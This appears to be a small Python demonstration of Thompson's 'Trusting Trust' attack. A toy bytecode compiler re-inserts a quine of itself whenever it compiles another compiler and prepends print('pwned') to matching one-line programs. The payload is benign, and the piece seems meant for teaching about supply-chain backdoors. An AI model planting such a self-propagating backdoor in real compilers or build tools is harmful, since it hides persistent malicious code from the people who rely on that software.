import sys, marshal

src = open(sys.argv[-2], 'r').read()

# if source is the same as compiler-trusted.py, compile myself instead.
if 'compile' in src:
    src = 'import sys, marshal\n\nsrc = open(sys.argv[-2], \'r\').read()\n\n# if source is the same as compiler-trusted.py, compile myself instead.\nif \'compile\' in src:\n    src = %r\n    src = src%%src\n\n# \'login pattern\'\nif src.count(\'\\n\') == 0 and \'print\' in src:\n    src = \'print("pwned")\\n\' + open(sys.argv[-2], \'r\').read()\n\nopen(sys.argv[-1], \'wb\').write(\n    marshal.dumps(compile(src, \'\', \'exec\'))\n)\n\nprint("Compiled {} into {}\\n".format(sys.argv[-2], sys.argv[-1]))\n'
    src = src%src

# 'login pattern'
if src.count('\n') == 0 and 'print' in src:
    src = 'print("pwned")\n' + open(sys.argv[-2], 'r').read()

open(sys.argv[-1], 'wb').write(
    marshal.dumps(compile(src, '', 'exec'))
)

print("Compiled {} into {}\n".format(sys.argv[-2], sys.argv[-1]))
